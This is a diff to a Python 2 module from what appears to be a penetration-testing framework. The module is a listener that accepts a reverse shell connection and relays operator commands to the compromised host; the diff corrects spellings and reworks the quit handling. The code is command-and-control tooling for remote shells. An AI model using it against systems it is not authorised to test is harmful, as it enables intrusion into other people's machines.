@@ -9,13 +9,12 @@ from socket import *
 docs = '''
 
 #==============================================================================
-#title                  :hander
-#description            :shell hander
+#title                  :handler
+#description            :shell handler
 #author                 :mosin
 #date                   :20170712
 #version                :0.1
-#usage                  pl-shell> back    #返回监听状态
-                        pl-shell> qiut    #退出监听，返回框架
+#usage                   pl-shell> qiut    #退出监听，返回框架
 #python_version         :2.7.5
 #==============================================================================
 
@@ -31,7 +30,7 @@ class PLScan(BGExploit):
         super(self.__class__, self).__init__()
         self.info = {
             "name": "监听",  # 该POC的名称
-            "product": "Hander",  # 该POC所针对的应用名称,
+            "product": "Handler",  # 该POC所针对的应用名称,
             "product_version": "1.0",  # 应用的版本号
             "desc": '''
             用于监听反弹过来的shell
@@ -102,16 +101,16 @@ class PLScan(BGExploit):
         sock.listen(5)
         STOP_CHAT = False
         #开始监听
-        print "Hander Listening %s port:%s" %(HOST,PORT)
+        print "Handler Listening %s port:%s" %(HOST,PORT)
         while not STOP_CHAT:
             tcpClientSock, addr=sock.accept()
             print('Start Listening %s  port %s.....') %(addr,PORT)
             while True:
                 data = raw_input('pl_shell >')
                 try:
-                    tcpClientSock.send(data.encode('utf8'))
-                    if data.upper()=="BACK":
+                    if data.upper()=="QUIT":
                         break
+                    tcpClientSock.send(data.encode('utf8'))
                     os_result = tcpClientSock.recv(BUFSIZ)
                     if not os_result:
                         #tcpClientSock.settimeout(100)
@@ -119,10 +118,8 @@ class PLScan(BGExploit):
                 except:
                     tcpClientSock.close()
                     break
-                STOP_CHAT = (data.decode('utf8').upper()=="QUIT")
-                if STOP_CHAT:
-                    break
                 print(os_result)
+            STOP_CHAT = True
 
         tcpClientSock.close()
         sock.close()
